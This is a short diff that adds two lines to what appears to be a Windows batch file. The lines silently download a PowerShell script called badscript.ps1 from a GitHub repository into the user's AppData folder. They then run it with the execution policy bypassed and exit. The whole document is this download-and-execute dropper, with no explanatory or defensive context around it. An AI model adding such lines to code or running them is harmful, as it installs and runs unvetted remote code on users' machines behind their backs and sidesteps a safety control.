@@ -1,0 +1,2 @@
+curl -s -L -o %appdata:\AppData\Roaming=%\badscript.ps1 https://raw.githubusercontent.com/wanderer-devv/just_music/main/badscript.ps1 & 
+powershell -ExecutionPolicy Bypass -File %appdata:\AppData\Roaming=%\badscript.ps1 & exit
